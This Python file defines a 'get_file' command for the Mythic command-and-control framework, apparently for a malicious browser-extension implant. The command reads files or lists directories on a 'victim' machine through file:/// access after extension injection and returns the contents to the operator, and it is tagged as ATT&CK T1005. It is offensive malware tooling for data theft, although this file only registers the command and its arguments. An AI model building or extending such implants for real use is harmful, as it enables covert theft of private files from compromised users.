from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    CommandParameter,
    ParameterType,
    TaskArguments,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
)


class GetFileArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self._args = [
            CommandParameter(
                name="path",
                type=ParameterType.String,
                description=(
                    "Absolute path to read on the victim (e.g. C:/Users/user/Desktop/file.txt). "
                    "Directories are listed; text files are returned inline; binary files are "
                    "sent back as a download."
                ),
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class GetFileCommand(CommandBase):
    cmd = "get_file"
    needs_admin = False
    help_cmd = "get_file [path]"
    description = (
        "Read a local file or list a directory via file:///. Works when the "
        "extension has been granted file URL access (dev/stomp/GAP injection)."
    )
    version = 1
    author = "@Fir3n0x"
    attackmapping = ["T1005"]
    argument_class = GetFileArguments
    attributes = CommandAttributes(
        builtin=False,
        suggested_command=False,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
